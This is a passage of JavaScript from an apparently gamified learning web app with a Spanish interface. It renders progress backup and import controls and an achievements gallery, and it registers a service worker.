            <strong style="font-size: 0.85rem; color: var(--text-muted);">OBJETIVO SECUNDARIO:</strong>
            <div style="font-weight: 600; margin-top: 2px;">${data.secondaryObjective}</div>
          </div>
        </div>

        <div class="card">
          <h3 style="font-size: 1.1rem; margin-bottom: 12px;">Copia de Seguridad y Datos</h3>
          <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 14px;">Descarga una copia JSON de tu progreso para migrarlo a tu teléfono o laptop.</p>
          <div style="display: flex; gap: 10px;">
            <button class="btn btn-primary" onclick="window.CyberStorage.exportBackup()">📥 Exportar Progreso JSON</button>
            <button class="btn btn-secondary" onclick="document.getElementById('import-file-input').click()">📤 Importar JSON</button>
            <input type="file" id="import-file-input" style="display: none;" onchange="window.CyberApp.handleImportFile(this)" />
          </div>
        </div>
      </div>

      <div class="card" style="margin-top: 20px;">
        <h3 style="font-size: 1.2rem; margin-bottom: 14px;">🏆 Galería de Logros (${data.unlockedAchievements.length} / ${achievements.length})</h3>
        <div class="grid-cards">
          ${achievements.map(ach => {
            const unlocked = data.unlockedAchievements.includes(ach.id);
            return `
              <div class="card" style="opacity: ${unlocked ? '1' : '0.4'}; border-color: ${unlocked ? 'var(--accent-yellow)' : 'var(--border-color)'};">
                <div style="font-size: 2rem; margin-bottom: 6px;">${ach.icon}</div>
                <div style="font-weight: 700; font-size: 0.95rem;">${ach.name}</div>
                <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">${ach.description}</div>
                <div style="font-size: 0.75rem; color: var(--accent-yellow); font-weight: bold; margin-top: 8px;">+${ach.xpReward} XP</div>
              </div>
            `;
          }).join('')}
        </div>
      </div>
    `;

    container.innerHTML = html;
  }

  handleImportFile(inputEl) {
    const file = inputEl.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        window.CyberStorage.importBackup(e.target.result);
      };
      reader.readAsText(file);
    }
  }

  registerServiceWorker() {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('./sw.js').then(reg => {
        reg.update();
      }).catch(err => console.log('SW registration skipped:', err));
    }
  }
}

function startCyberLabApp() {
  if (!window.CyberApp) {
    window.CyberApp = new CyberLabApp();
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', startCyberLabApp);
} else {
  startCyberLabApp();
}
